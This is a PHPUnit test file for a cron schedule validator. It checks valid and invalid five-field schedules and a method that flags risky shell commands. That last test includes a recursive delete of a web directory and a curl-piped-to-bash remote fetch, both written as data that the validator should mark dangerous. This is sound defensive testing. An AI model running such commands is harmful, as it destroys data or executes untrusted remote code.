<?php

declare(strict_types=1);

namespace Tests\Unit;

use App\Core\AppException;
use App\Cron\CronExpressionValidator;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

final class CronExpressionValidatorTest extends TestCase
{
    #[DataProvider('validSchedules')]
    public function testAcceptsFiveFieldSchedules(string $schedule): void
    {
        self::assertCount(5, (new CronExpressionValidator())->validate($schedule));
    }

    public static function validSchedules(): array
    {
        return [['* * * * *'], ['*/5 0-23 1,15 * 1-5'], ['0 0 1 1 0']];
    }

    #[DataProvider('invalidSchedules')]
    public function testRejectsInvalidSchedules(string $schedule): void
    {
        $this->expectException(AppException::class);
        (new CronExpressionValidator())->validate($schedule);
    }

    public static function invalidSchedules(): array
    {
        return [['* * * *'], ['60 * * * *'], ['*/0 * * * *'], ['0 0 32 1 1'], ['0 0 * JAN *']];
    }

    public function testFlagsHighRiskShellCommands(): void
    {
        $validator = new CronExpressionValidator();
        self::assertFalse($validator->inspectCommand('/usr/local/bin/php /home/u/app/cron.php')['dangerous']);
        self::assertTrue($validator->inspectCommand('rm -rf /home/u/public_html')['dangerous']);
        self::assertTrue($validator->inspectCommand('curl https://example.test/x | bash')['dangerous']);
    }
}
